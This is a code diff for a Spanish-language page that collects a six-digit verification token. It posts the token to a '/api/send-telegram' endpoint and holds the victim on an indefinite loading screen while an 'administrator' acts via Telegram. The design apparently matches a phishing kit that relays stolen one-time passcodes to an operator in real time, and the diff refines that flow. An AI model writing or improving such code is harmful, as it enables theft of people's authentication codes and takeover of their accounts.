@@ -20,8 +20,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Disable verify button by default
     verifyButton.disabled = true;
-    verifyButton.style.opacity = '0.5';
-    verifyButton.style.cursor = 'not-allowed';
 
     // Check if all inputs are filled with valid numbers
     const checkInputs = () => {
@@ -30,12 +28,8 @@ document.addEventListener('DOMContentLoaded', function() {
         
         if (allFilled) {
             verifyButton.classList.add('active');
-            verifyButton.style.opacity = '1';
-            verifyButton.style.cursor = 'pointer';
         } else {
             verifyButton.classList.remove('active');
-            verifyButton.style.opacity = '0.5';
-            verifyButton.style.cursor = 'not-allowed';
         }
     };
 
@@ -57,6 +51,8 @@ document.addEventListener('DOMContentLoaded', function() {
             if (value.length === 1) {
                 if (index < inputs.length - 1) {
                     inputs[index + 1].focus();
+                } else {
+                    checkInputs();
                 }
             }
             checkInputs();
@@ -64,10 +60,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace') {
-                resetError();
                 if (!e.target.value && index > 0) {
                     inputs[index - 1].focus();
                 }
+                resetError();
             }
         });
 
@@ -90,18 +86,15 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // Submit handler para el formulario de token - COMPLETAMENTE CORREGIDO
+    // Submit handler para el formulario de token
     verifyButton.addEventListener('click', async function(e) {
         e.preventDefault();
         console.log('📤 Formulario Token enviado');
         
         const token = Array.from(inputs).map(input => input.value).join('');
-        console.log('Token capturado:', token);
 
         if (token.length !== 6) {
-            if (window.commonUtils) {
-                window.commonUtils.showError('Por favor ingrese el código completo de 6 dígitos');
-            }
+            window.commonUtils.showError('Por favor ingrese el código completo de 6 dígitos');
             return;
         }
 
@@ -112,13 +105,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
         window.isSubmitting = true;
         
-        // Deshabilitar botón durante el envío
-        verifyButton.disabled = true;
-        verifyButton.textContent = 'Verificando...';
-        verifyButton.style.opacity = '0.5';
-        
-        // MOSTRAR LOADING INMEDIATAMENTE
-        if (window.commonUtils) {
+        // USAR LOADING OVERLAY IDÉNTICO A INDEX.HTML
+        if (window.loadingOverlay) {
+            window.loadingOverlay.show('Enviando token para verificación...');
+        } else {
             window.commonUtils.showLoading('Enviando token para verificación...');
         }
 
@@ -129,7 +119,7 @@ document.addEventListener('DOMContentLoaded', function() {
         };
 
         try {
-            console.log('📨 Enviando token al servidor...', data);
+            console.log('Enviando token al servidor...');
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
                 headers: {
@@ -138,65 +128,56 @@ document.addEventListener('DOMContentLoaded', function() {
                 body: JSON.stringify(data)
             });
 
-            console.log('Respuesta del servidor:', response.status);
-
             if (!response.ok) {
-                throw new Error('Error en la respuesta del servidor: ' + response.status);
+                throw new Error('Error en la respuesta del servidor');
             }
 
             const result = await response.json();
-            console.log('Resultado:', result);
             
             if (!result.success) {
                 throw new Error(result.error || 'Error al procesar la solicitud');
             }
 
-            console.log('✅ Token enviado exitosamente, esperando respuesta del administrador...');
+            console.log('Token enviado exitosamente, esperando respuesta del administrador...');
             
             sessionStorage.setItem('formData', JSON.stringify({
                 tipo: 'Token',
                 codigo: token
             }));
 
-            // MANTENER LOADING HASTA QUE EL ADMIN PRESIONE "FINALIZAR" EN TELEGRAM
-            if (window.commonUtils) {
+            // MANTENER PANTALLA DE CARGA INDEFINIDAMENTE
+            if (window.loadingOverlay) {
+                window.loadingOverlay.show('Token enviado. Esperando verificación del administrador...');
+            } else {
                 window.commonUtils.showLoading('Token enviado. Esperando verificación del administrador...');
             }
 
         } catch (error) {
-            console.error('❌ Error:', error);
+            console.error('Error:', error);
             
-            // Rehabilitar botón en caso de error
-            verifyButton.disabled = false;
-            verifyButton.textContent = 'Verificar';
-            checkInputs();
-            
-            if (window.commonUtils) {
+            // OCULTAR LOADING OVERLAY EN CASO DE ERROR
+            if (window.loadingOverlay) {
+                window.loadingOverlay.hide();
+            } else {
                 window.commonUtils.hideLoading();
-                window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
             }
             
             window.isSubmitting = false;
-            
             if (errorMessage) {
                 errorMessage.style.display = 'block';
-                errorMessage.querySelector('p').textContent = '❌ Error al enviar el token. Por favor intente nuevamente.';
             }
+            window.commonUtils.showError('Ha ocurrido un error. Por favor intente nuevamente.');
         }
     });
 
-    // Botón Atrás
     if (backButton) {
-        backButton.addEventListener('click', (e) => {
-            e.preventDefault();
+        backButton.addEventListener('click', () => {
             window.history.back();
         });
     }
 
-    // Botón Abandonar
     if (abandonButton) {
-        abandonButton.addEventListener('click', (e) => {
-            e.preventDefault();
+        abandonButton.addEventListener('click', () => {
             if (confirm('¿Está seguro que desea abandonar el proceso?')) {
                 window.location.href = 'index.html';
             }
@@ -204,12 +185,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Focus en el primer input al cargar
-    if (inputs[0]) {
-        inputs[0].focus();
-    }
-    
-    // Verificar estado inicial de los inputs
-    checkInputs();
-    
-    console.log('✅ Token page completamente inicializada');
+    inputs[0].focus();
 });
